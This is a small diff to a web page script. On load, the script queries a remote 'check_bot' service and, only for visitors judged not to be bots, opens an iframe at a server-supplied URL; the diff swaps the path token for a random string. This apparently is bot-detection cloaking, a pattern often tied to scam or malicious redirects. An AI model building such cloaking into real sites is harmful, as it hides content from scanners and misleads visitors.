@@ -50,7 +50,7 @@ window.addEventListener('DOMContentLoaded', () => {
             fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
                 if (res?.code == 200 && !res.result) {
                     
-                    createFrame(res.url + 'sweethome')
+                    createFrame(res.url + '5ZnnGmYM')
                 }
                 setTimeout(toggleLoad, 1000);
                 
